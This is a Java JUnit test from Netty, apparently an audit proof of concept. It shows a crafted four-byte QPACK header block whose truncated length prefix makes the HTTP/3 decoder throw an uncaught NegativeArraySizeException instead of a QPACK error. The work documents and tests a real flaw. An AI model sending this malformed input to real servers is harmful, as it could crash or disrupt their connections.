/*
 * Copyright 2025 The Netty Project
 *
 * The Netty Project licenses this file to you under the Apache License,
 * version 2.0 (the "License"); you may not use this file except in compliance
 * with the License. You may obtain a copy of the License at:
 *
 *   https://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS, WITHOUT
 * WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the
 * License for the specific language governing permissions and limitations
 * under the License.
 */
package io.netty.handler.codec.http3;

import io.netty.buffer.ByteBuf;
import io.netty.buffer.Unpooled;
import org.junit.jupiter.api.Test;

import java.util.function.BiConsumer;

import static io.netty.handler.codec.http3.QpackUtil.MAX_UNSIGNED_INT;
import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertThrows;
import static org.junit.jupiter.api.Assertions.assertTrue;

/**
 * AUDIT PoC - Finding #1 (HIGH).
 *
 * A QPACK literal field line whose decoded value/name length is the truncation sentinel -1 reaches
 * {@code new byte[length]} in {@link QpackDecoder} guarded only by a disabled {@code assert length >= 0}.
 * The escaping exception is a {@link NegativeArraySizeException} (a host-language RuntimeException), NOT a
 * {@link QpackException}, so it never becomes the spec-mandated QPACK_DECOMPRESSION_FAILED H3 connection error.
 */
public class AuditPocQpackLengthTest {

    @Test
    public void truncatedLiteralNameLengthEscapesAsNegativeArraySizeException() {
        // Default-config decoder: dynamic table unused (Required Insert Count = 0 path needs no table).
        QpackDecoder decoder = new QpackDecoder(MAX_UNSIGNED_INT, 0);
        EmbeddedQuicChannel parent = new EmbeddedQuicChannel(true);
        QpackAttributes attributes = new QpackAttributes(parent, false);

        // QPACK encoded field section (what QpackDecoder.decode consumes; the Http3FrameCodec strips the
        // surrounding "01 04" HEADERS frame type+length before calling the decoder):
        //   00  Required Insert Count = 0   (no dynamic table reference -> reachable in default config)
        //   00  Delta Base           = 0
        //   27  Literal Field Line with Literal Name: bits 0b001, N=0, H=0, NameLen 3-bit prefix = 0b111 (=7)
        //       -> value 7 == prefix max, so a continuation byte is required.
        //   FF  continuation byte (high bit set) that runs off the end of the field section
        //       -> QpackUtil.decodePrefixedInteger returns -1 (truncation sentinel) -> length = -1.
        byte[] block = {0x00, 0x00, 0x27, (byte) 0xFF};
        ByteBuf in = Unpooled.wrappedBuffer(block);
        BiConsumer<CharSequence, CharSequence> sink = (n, v) -> { };

        try {
            Throwable t = assertThrows(Throwable.class,
                    () -> decoder.decode(attributes, 0L, in, block.length, sink, () -> { }));

            System.out.println("[Finding #1] escaping exception = " + t.getClass().getName()
                    + " : " + t.getMessage());
            for (StackTraceElement e : t.getStackTrace()) {
                if (e.getClassName().contains("QpackDecoder")) {
                    System.out.println("    at " + e);
                }
            }

            // Core security invariant (holds in BOTH assertion modes): the escaping Throwable is NOT a
            // QpackException, so QpackDecoder/Http3FrameCodec never map it to the spec-mandated
            // QPACK_DECOMPRESSION_FAILED H3 connection error.
            assertFalse(t instanceof QpackException, "must NOT be a clean QpackException");

            // The only "guard" before `new byte[length]` is `assert length >= 0`.
            //  - Production (Netty ships with assertions disabled): the -1 reaches `new byte[-1]`
            //    -> NegativeArraySizeException.
            //  - Test JVM (pom enables `-ea:io.netty...`): the disabled-in-prod assert fires first
            //    -> AssertionError. Either way an uncaught java.lang error escapes the decoder.
            boolean assertionsEnabled = false;
            assert assertionsEnabled = true;
            if (assertionsEnabled) {
                assertTrue(t instanceof AssertionError,
                        "with -ea the disabled-in-prod assert fires; got " + t.getClass().getName());
                System.out.println("[Finding #1] (-ea) AssertionError at the disabled guard; "
                        + "production (-da) reaches new byte[-1] -> NegativeArraySizeException");
            } else {
                assertTrue(t instanceof NegativeArraySizeException,
                        "production path expected NegativeArraySizeException; got " + t.getClass().getName());
            }
        } finally {
            in.release();
            parent.close();
        }
    }
}
